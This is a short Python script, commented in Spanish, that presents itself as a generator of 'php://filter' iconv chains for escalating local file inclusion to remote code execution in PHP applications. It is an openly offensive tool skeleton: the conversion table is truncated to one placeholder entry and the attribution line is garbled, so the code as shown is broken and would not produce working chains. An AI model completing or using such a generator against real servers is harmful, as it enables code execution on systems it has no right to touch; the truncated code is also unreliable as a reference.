#!/usr/bin/env python3
"""
PHP Filter Chain Generator (Professional Edition).
Autogenera cadenas 'php://filter' para LFI-to-RCE (convirtiendo payloads a base64 usando iconos).
Basado en investigaciones de y.
"""

import argparse
import base64
import sys
from typing import Dict

class PHPFilterGenerator:
    # Diccionario simplificado de conversión iconv (se requieren los pares específicos)
    # Nota: El script completo requiere el diccionario de conversiones al 100% como se muestra en
    CONVERSIONS: Dict[str, str] = {
        '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|...',
        # ... (tabla completa necesaria)
    }

    @classmethod
    def generate_chain(cls, base64_payload: str) -> str:
        # Lógica: Iniciar con filtros de codificación, iterar cadena a la inversa, 
        # aplicar filtros de conversión y finalizar con descodificación base64.
        filters = "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7"
        for char in reversed(base64_payload):
            if char in cls.CONVERSIONS:
                filters += f"|{cls.CONVERSIONS[char]}"
        filters += "|convert.base64-decode"
        return f"php://filter/{filters}/resource=php://temp"

def main() -> None:
    parser = argparse.ArgumentParser(description="PHP Filter Chain Generator")
    parser.add_argument("--chain", help="Payload PHP", required=True)
    args = parser.parse_args()

    # Codificar payload y generar cadena
    encoded = base64.b64encode(args.chain.encode('utf-8')).decode('utf-8').replace("=", "")
    print(PHPFilterGenerator.generate_chain(encoded))

if __name__ == "__main__":
    main()
